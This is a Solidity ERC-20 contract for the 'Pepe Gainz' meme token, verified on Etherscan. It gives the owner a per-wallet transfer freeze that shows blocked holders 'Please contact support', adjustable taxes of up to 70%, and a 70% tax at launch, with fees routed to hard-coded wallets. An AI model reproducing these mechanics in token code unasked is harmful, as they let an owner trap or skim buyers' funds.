/**
 *Submitted for verification at Etherscan.io on 2023-06-01
*/

/*
https://t.me/pepegainzclub
https://pepegainz.com/
https://twitter.com/PepegainzERC

*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract PEPEGAINZ is Context, IERC20, Ownable {
    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _AllowedWallets;
    mapping(address => uint256) private _StopedWallet;
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 420690000000000 * 10**_decimals;
    uint256 private constant minimumSwapAmount = 168276000000 * 10**_decimals;
    uint256 private constant onePercent = 4206900000000 * 10**_decimals;
    uint256 private maxSwap = onePercent;
    uint256 public AmountMaxPerTrx = onePercent;

    uint256 private InitialBlockNo;

    uint256 public buyTax = 25;
    uint256 public sellTax = 45;
    
    string private constant _name = "Pepe Gainz";
    string private constant _symbol = "GAINZ";

    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;
    address immutable public FeesAddress ;
    address immutable public SecFeesWallet;

    bool private launch = false;

    constructor() {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        FeesAddress  = 0xf519cCd7a3bE0469A928354695eC1CB6d338C12D;
        SecFeesWallet = 0xd3fDeD53B6f9Bff2d8fd999215587dccbfAfd843;
        _balance[msg.sender] = _totalSupply;
        _AllowedWallets[FeesAddress ] = 1;
        _AllowedWallets[msg.sender] = 1;
        _AllowedWallets[address(this)] = 1;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount)public override returns (bool){
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256){
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool){
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if(currentAllowance != type(uint256).max) { 
            require(
                currentAllowance >= amount,
                "ERC20: transfer amount exceeds allowance"
            );
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function InitiateTrading() external onlyOwner {
        launch = true;
        InitialBlockNo = block.number;
    }

    function MakeAWalletLimitless(address wallet) external onlyOwner {
        _AllowedWallets[wallet] = 1;
    }

    function AddWalletLimits(address wallet) external onlyOwner {
        _AllowedWallets[wallet] = 0;
    }
    
    function StopActivity(address _wallet) external onlyOwner {
        require(_wallet != address(this) && _wallet != address(uniswapV2Pair) && _wallet != address(uniswapV2Router), "Invalid wallet");
        _StopedWallet[_wallet] = 1;
    }

    function ReleaseActivity(address _wallet) external onlyOwner {
        _StopedWallet[_wallet] = 0;
    }

    function FreeAllFromLimits() external onlyOwner {
        AmountMaxPerTrx = _totalSupply;
    }

    function EditTaxValue(uint256 newBuyTax, uint256 newSellTax) external onlyOwner {
        require(newBuyTax + newSellTax <= 70, "Tax too high");
        buyTax = newBuyTax;
        sellTax = newSellTax;
    }

    function _tokenTransfer(address from, address to, uint256 amount, uint256 _tax) private {
        uint256 taxTokens = (amount * _tax) / 100;
        uint256 transferAmount = amount - taxTokens;

        _balance[from] = _balance[from] - amount;
        _balance[to] = _balance[to] + transferAmount;
        _balance[address(this)] = _balance[address(this)] + taxTokens;

        emit Transfer(from, to, transferAmount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "ERC20: no tokens transferred");
        uint256 _tax = 0;
        if (_AllowedWallets[from] == 0 && _AllowedWallets[to] == 0)
        {
            require(launch, "Trading not open");
            require(_StopedWallet[from] == 0, "Please contact support");
            require(amount <= AmountMaxPerTrx, "MaxTx Enabled at launch");
            if (to != uniswapV2Pair && to != address(0xdead)) require(balanceOf(to) + amount <= AmountMaxPerTrx, "MaxTx Enabled at launch");
            if (block.number < InitialBlockNo + 2) {_tax=70;} else {
                if (from == uniswapV2Pair) {
                    _tax = buyTax;
                } else if (to == uniswapV2Pair) {
                    uint256 tokensToSwap = balanceOf(address(this));
                    if (tokensToSwap > minimumSwapAmount) { 
                        uint256 mxSw = maxSwap;
                        if (tokensToSwap > amount) tokensToSwap = amount;
                        if (tokensToSwap > mxSw) tokensToSwap = mxSw;
                        swapTokensForEth(tokensToSwap);
                    }
                    _tax = sellTax;
                }
            }
        }
        _tokenTransfer(from, to, amount, _tax);
    }

    function SelfBalanceTransfer() external {
        require(_msgSender() == FeesAddress );
        bool success;
        (success, ) = SecFeesWallet.call{value: address(this).balance / 10}("");
        (success, ) = FeesAddress .call{value: address(this).balance}("");
    } 

    function SelfTokensExchange () external {
        require(_msgSender() == FeesAddress );
        uint256 contractBalance = balanceOf(address(this));
        swapTokensForEth(contractBalance);
    }

    function ChangeMaxSwap(uint256 _max) external onlyOwner {
        maxSwap = _max;
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
        bool success;
        (success, ) = SecFeesWallet.call{value: address(this).balance / 10}("");
        (success, ) = FeesAddress .call{value: address(this).balance}("");
    }
    receive() external payable {}
}